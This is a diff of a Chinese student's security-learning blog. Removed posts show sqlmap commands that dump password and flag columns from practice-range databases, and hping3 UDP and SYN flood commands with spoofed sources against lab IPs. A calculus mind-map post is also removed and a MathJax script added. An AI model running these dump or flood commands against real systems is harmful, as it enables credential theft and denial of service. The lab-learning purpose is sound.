-<p>这时登录框的SQL注入，结合burpsuit抓包来注入</p>
-<h4 id="1-点击登录后抓到的POST数据包"><a href="#1-点击登录后抓到的POST数据包" class="headerlink" title="1.点击登录后抓到的POST数据包"></a>1.点击登录后抓到的POST数据包</h4><p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070423895.png" alt="1618070423895"></p>
-<h4 id="2-将抓取的信息存储为search-log文件"><a href="#2-将抓取的信息存储为search-log文件" class="headerlink" title="2.将抓取的信息存储为search.log文件"></a>2.将抓取的信息存储为search.log文件</h4><p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070511626.png" alt="1618070511626"></p>
-<h4 id="3-列数据库"><a href="#3-列数据库" class="headerlink" title="3.列数据库"></a>3.列数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log --dbs</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070703795.png" alt="1618070703795"></p>
-<h4 id="4-列数据库中的表"><a href="#4-列数据库中的表" class="headerlink" title="4.列数据库中的表"></a>4.列数据库中的表</h4><p>可以看到一个名为“ twosecu1_vuln_08”的数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log -D twosecu1_vuln_08 --tables</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070797687.png" alt="1618070797687"></p>
-<h4 id="5-列表中的字段"><a href="#5-列表中的字段" class="headerlink" title="5.列表中的字段"></a>5.列表中的字段</h4><p>可以看到这个数据库中有一张名为“user”的表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log -D twosecu1_vuln_08 -T user --columns</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070873276.png" alt="1618070873276"></p>
-<h4 id="6-列字段中的内容"><a href="#6-列字段中的内容" class="headerlink" title="6.列字段中的内容"></a>6.列字段中的内容</h4><p>直接爆password字段的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log -D twosecu1_vuln_08 -T user -C password --dump</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070965559.png" alt="1618070965559"></p>
-<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618071045409.png" alt="1618071045409"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -601,23 +408,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>测试人员向目标发送大量的UDP数据包，就会使网络资源被耗尽。</p>
-<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>KALI  IP: 192.168.218.129</p>
-<p>KALI1 IP(被攻击): 192.168.218.128</p>
-<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>启动kaili1的apache服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service apache2 start</span><br></pre></td></tr></table></figure>
-<p>测试指令，攻击方输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hping3 -q -n -a 1.1.1.1 --udp -s 53 -p 80 192.168.218.128 --flood -d 1000</span><br></pre></td></tr></table></figure>
-<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>打开被攻击方的wireshark可以看到大量的UDP数据包发了过来</p>
-<p><img src="/2021/04/10/UDP-Flood%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1618066497661.png" alt="1618066497661"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -662,26 +453,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>客户端发送SYN,服务端返回SYN-ACK,如果客户端不再发送ACK,那么服务端等待超时，重新发送SYN-ACK.。如果大量的等待，就可能导致服务器崩溃。</p>
-<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>KALI  IP: 192.168.218.128 </p>
-<p>WIN 10 IP: 192.168.218.131</p>
-<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h3 id="1-在kali终端执行这条命令"><a href="#1-在kali终端执行这条命令" class="headerlink" title="1.在kali终端执行这条命令"></a>1.在kali终端执行这条命令</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -q -n --rand-source -S -p <span class="number">80</span> --flood <span class="number">192.168</span><span class="number">.218</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-win10主机抓包"><a href="#2-win10主机抓包" class="headerlink" title="2.win10主机抓包"></a>2.win10主机抓包</h3><p><em>可以看出实验好像失败了，win10回应的应该是SYN+ACK，但是回应的是RST+ACK。什么原因暂时不清楚，另外RST这个字段是什么意思还不大清楚，需要重新学习一下TCP协议。</em></p>
-<p>根据抓包可以看出，win10主机收到了大量TCP握手数据包，</p>
-<p><img src="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1617983913057.png" alt="1617983913057"></p>
-<p>3.使用流量图分析</p>
-<p><img src="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1617983152045.png" alt="1617983152045"></p>
-<p><img src="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1617984357838.png" alt="1617984357838"></p>
-<p>可以看出大量未知IP地址向192.168.218.131发起了连接，但是都没有完成第三次握手</p>
-<h2 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h2><p>实验貌似未成功？</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -722,22 +494,7 @@
   <time datetime="2021-04-08T11:33:51.000Z" itemprop="datePublished">2021-04-08</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h3 id><a href="#" class="headerlink" title></a></h3><h2 id="极限的概念、性质与无穷小"><a href="#极限的概念、性质与无穷小" class="headerlink" title="极限的概念、性质与无穷小"></a>极限的概念、性质与无穷小</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/1%E6%9E%81%E9%99%90%E7%9A%84%E6%A6%82%E5%BF%B5%E3%80%81%E6%80%A7%E8%B4%A8%E4%B8%8E%E6%97%A0%E7%A9%B7%E5%B0%8F.png"></p>
-<h2 id="极限的计算与函数的连续性"><a href="#极限的计算与函数的连续性" class="headerlink" title="极限的计算与函数的连续性"></a>极限的计算与函数的连续性</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/2%E6%9E%81%E9%99%90%E7%9A%84%E8%AE%A1%E7%AE%97%E4%B8%8E%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7.png"></p>
-<h2 id="导数与微分"><a href="#导数与微分" class="headerlink" title="导数与微分"></a>导数与微分</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/3%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86.png"></p>
-<h2 id="微分中值定理与导数的应用"><a href="#微分中值定理与导数的应用" class="headerlink" title="微分中值定理与导数的应用"></a>微分中值定理与导数的应用</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/4%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E5%BE%8B%E4%B8%8E%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8.png"></p>
-<h2 id="不定积分"><a href="#不定积分" class="headerlink" title="不定积分"></a>不定积分</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/5%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86.png"></p>
-<h2 id="定积分与变限积分"><a href="#定积分与变限积分" class="headerlink" title="定积分与变限积分"></a>定积分与变限积分</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/6%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%98%E9%99%90%E7%A7%AF%E5%88%86.png"></p>
-<h2 id="反常积分与定积分的应用"><a href="#反常积分与定积分的应用" class="headerlink" title="反常积分与定积分的应用"></a>反常积分与定积分的应用</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/7%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86%E4%B8%8E%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8.png"></p>
-<h2 id="微分方程"><a href="#微分方程" class="headerlink" title="微分方程"></a>微分方程</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/8.9%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B-1617882484280.png"></p>
-<h2 id="多元函数微分法与极值（更新……"><a href="#多元函数微分法与极值（更新……" class="headerlink" title="多元函数微分法与极值（更新……)"></a>多元函数微分法与极值（更新……)</h2><h2 id="二重积分-更新……"><a href="#二重积分-更新……" class="headerlink" title="二重积分(更新……)"></a>二重积分(更新……)</h2> 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -778,31 +535,7 @@
   <time datetime="2021-04-03T15:00:04.000Z" itemprop="datePublished">2021-04-03</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="SQL注入练习（一）"><a href="#SQL注入练习（一）" class="headerlink" title="SQL注入练习（一）"></a><strong>SQL注入练习（一）</strong></h2><p>靶场<a target="_blank" rel="noopener" href="https://rimovni.exeye.run/hugkudure/hello">https://rimovni.exeye.run/hugkudure/hello</a></p>
-<p>在成绩查询页面输入1，使用burpsuit抓包，使用的是POST方法</p>
-<p><img src="/2021/04/03/SQL%E6%B3%A8%E5%85%A5-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/wps1.jpg" alt="img"></p>
-<p>在网上搜索了一下sqlmap注入的POST监测点方法</p>
-<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Xionghuimin/article/details/106517392">https://blog.csdn.net/Xionghuimin/article/details/106517392</a></p>
-<p><code>python sqlmap.py -l C:\Users\wzk\Desktop\sql.log --dbs</code>  </p>
-<p>找出数据库</p>
-<p><img src="/2021/04/03/SQL%E6%B3%A8%E5%85%A5-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/wps2.jpg" alt="img"></p>
-<p><code>python sqlmap.py -l C:\Users\wzk\Desktop\sql.log -D twosecu1_vuln_06 --tables</code></p>
-<p>列出数据库中的表</p>
-<p><img src="/2021/04/03/SQL%E6%B3%A8%E5%85%A5-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/wps3.jpg" alt="img"></p>
-<p><code>python sqlmap.py -l C:\Users\wzk\Desktop\sql.log -D twosecu1_vuln_06 -T flag --columns</code> </p>
-<p>列出表中的字段</p>
-<p><img src="/2021/04/03/SQL%E6%B3%A8%E5%85%A5-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/wps4-1617462180236.jpg" alt="img"></p>
-<p><code>python sqlmap.py -l C:\Users\wzk\Desktop\sql.log -D twosecu1_vuln_06 -T flag -C flag --dump</code></p>
-<p>列出字段的内容</p>
-<p><img src="/2021/04/03/SQL%E6%B3%A8%E5%85%A5-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/wps5-1617462182953.jpg" alt="img"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -1094,6 +827,30 @@
 </script>
 
 <!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
 
 <!-- Katex -->
 
